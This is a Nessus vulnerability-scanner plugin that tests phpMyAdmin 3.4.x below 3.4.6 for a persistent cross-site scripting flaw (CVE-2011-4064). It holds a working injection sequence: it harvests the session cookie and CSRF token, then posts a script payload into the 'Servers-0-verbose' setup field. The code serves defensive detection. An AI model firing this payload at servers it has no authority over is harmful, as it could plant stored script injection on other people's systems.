#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(56652);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2016/05/16 14:22:06 $");

  script_cve_id("CVE-2011-4064");
  script_bugtraq_id(50175);
  script_osvdb_id(76711);

  script_name(english:"phpMyAdmin 3.4.x < 3.4.6 XSS (PMASA-2011-16)");
  script_summary(english:"Checks for cross-site scripting in phpMyAdmin");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
a cross-site scripting vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of phpMyAdmin hosted on the remote server is 3.4.x prior
to 3.4.6 and is affected by a cross-site scripting vulnerability.  The
'Servers-0-verbose' parameter is not properly sanitized by methods in
'libraries/config/ConfigFile.class.php' as called by the script
'setup/index.php'.  Persistent cross-site scripting is possible if
improper filesystem permissions are in place.
");

  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?45ba6757");
  script_set_attribute(attribute:"see_also", value:"http://www.phpmyadmin.net/home_page/security/PMASA-2011-16.php");
  script_set_attribute(attribute:"solution", value:
"Apply the vendor patches or upgrade to phpMyAdmin version 3.4.6 or
later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/10/17");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/10/17");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/10/26");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:phpmyadmin:phpmyadmin");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2011-2016 Tenable Network Security, Inc.");

  script_dependencies("phpMyAdmin_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/phpMyAdmin", "www/PHP");
  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");


port    = get_http_port(default:80, php:TRUE);
install = get_install_from_kb(appname:"phpMyAdmin", port:port, exit_on_fail:TRUE);
dir = install['dir'];

r = http_send_recv3(
  port   : port,
  method : "GET",
  item   : dir
           + '/setup/index.php?tab_hash=&check_page_refresh=1'
           + '&page=servers&mode=add&submit=New+server',
  exit_on_fail : TRUE
);

# parse cookie out
headers = parse_http_headers(status_line:r[0], headers:r[1]);
if (isnull(headers)) exit(1, "Error parsing HTTP headers on port "+port+".");

cookie_header = headers['set-cookie'];
if (isnull(cookie_header)) exit(1, "Did not receive a phpMyAdmin cookie on port "+port+".");
cookie = get_any_http_cookie(name:'phpMyAdmin');
if (strlen(cookie) == 0) exit(1, "'phpMyAdmin cookie not received on port "+port+".");

# parse token out
pattern = 'name="token"[ ]+value="(.*)"';
foreach line (split(r[2], keep:0))
{
  matches = eregmatch(
    string: line,
    pattern: pattern
  );

  if (!isnull(matches))
  {
    token = matches[1];
    break;
  }
}
if (isnull(token)) exit(1, "Unable to parse token from response on port "+port+".");

magic = 'NESSUS_' + unixtime() + SCRIPT_NAME;
xss   = '<script>alert(/'+magic+'/)</script>';

post_data = 'phpMyAdmin='
  +cookie+
  '&tab_hash=&check_page_refresh=1&token='
  +token+
  '&Servers-0-verbose='
  +xss+
  '&Servers-0-host=localhost&Servers-0-port=&Servers-0-socket=&Servers-0-connect_type=tcp&Servers-0-extension=mysqli&submit_save=Save&Servers-0-auth_type=cookie&Servers-0-user=root&Servers-0-password=&Servers-0-auth_swekey_config=&Servers-0-auth_http_realm=&Servers-0-SignonSession=&Servers-0-SignonURL=&Servers-0-LogoutURL=&Servers-0-only_db=&Servers-0-only_db-userprefs-allow=on&Servers-0-hide_db=&Servers-0-hide_db-userprefs-allow=on&Servers-0-AllowRoot=on&Servers-0-DisableIS=on&Servers-0-AllowDeny-order=&Servers-0-AllowDeny-rules=&Servers-0-ShowDatabasesCommand=SHOW+DATABASES&Servers-0-pmadb=&Servers-0-controluser=&Servers-0-controlpass=&Servers-0-verbose_check=on&Servers-0-bookmarktable=&Servers-0-relation=&Servers-0-userconfig=&Servers-0-table_info=&Servers-0-column_info=&Servers-0-history=&Servers-0-tracking=&Servers-0-table_coords=&Servers-0-pdf_pages=&Servers-0-designer_coords=&Servers-0-tracking_default_statements=CREATE+TABLE%2CALTER+TABLE%2CDROP+TABLE%2CRENAME+TABLE%2CCREATE+INDEX%2CDROP+INDEX%2CINSERT%2CUPDATE%2CDELETE%2CTRUNCATE%2CREPLACE%2CCREATE+VIEW%2CALTER+VIEW%2CDROP+VIEW%2CCREATE+DATABASE%2CALTER+DATABASE%2CDROP+DATABASE&Servers-0-tracking_add_drop_view=on&Servers-0-tracking_add_drop_table=on&Servers-0-tracking_add_drop_database=on';

referrer_url = build_url(port:port, qs:dir + '/setup/index.php?tab_hash=&check_page_refresh=1&token='+token+'&page=servers&mode=add&submit=New+server');
request_url  = '/pma/setup/index.php?tab_hash=&check_page_refresh=1&token='+token+'&page=servers&mode=add&submit=New+server';

r = http_send_recv3(
  port   : port,
  method : "POST",
  item   : request_url,
  data   : post_data,
  follow_redirect : 1,
  add_headers     : make_array(
    'Referrer'     , referrer_url,
    'Content-Type' , 'application/x-www-form-urlencoded'
  ),
  exit_on_fail : TRUE
);

if (
  "<h4>Use SSL ("+xss >< r[2] &&
  "<title>phpMyAdmin setup</title>" >< r[2]
)
{
  set_kb_item(name:'www/'+port+'/XSS', value:TRUE);

  if (report_verbosity > 0)
  {
    if (report_verbosity > 1)
    {
      last_req = http_last_sent_request();

      # grab vuln output
      vuln_output = strstr(r[2], '<h4>Use SSL');
      vuln_output = substr(vuln_output, 0, stridx(vuln_output, '.</div>'));

      footer = '\nThe full request was : \n\n'
               + last_req
               + '\nThe following HTTP POST data was used :\n\n'
               + post_data
               + '\n\n'
               + '\nThe HTML output was :\n\n'
               + vuln_output;

    }
    report = get_vuln_report(
      port    : port,
      items   : request_url,
      trailer : footer
    );
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
  exit(0);
}
else exit(0, "The phpMyAdmin install at "+build_url(port:port, qs:dir)+" is not affected.");
